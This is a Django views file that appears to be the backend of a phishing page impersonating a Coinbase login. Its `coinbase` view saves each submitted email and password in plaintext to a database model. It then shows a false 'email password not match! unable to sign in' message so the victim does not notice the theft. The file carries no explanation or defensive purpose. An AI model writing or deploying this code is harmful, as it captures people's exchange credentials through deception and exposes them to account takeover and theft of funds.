from django.shortcuts import render
from .models import coinbase
from . import models

from django.contrib import messages

# Create your views here.


def coin(request):
    return render(request, 'base/coin.html')


def coinbase(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        coinbase = models.coinbase.objects.create(email=email, password=password)
        coinbase.save()
        messages.success(request, 'email password not match! unable to sign in.')
        return render(request, 'base/coin.html')

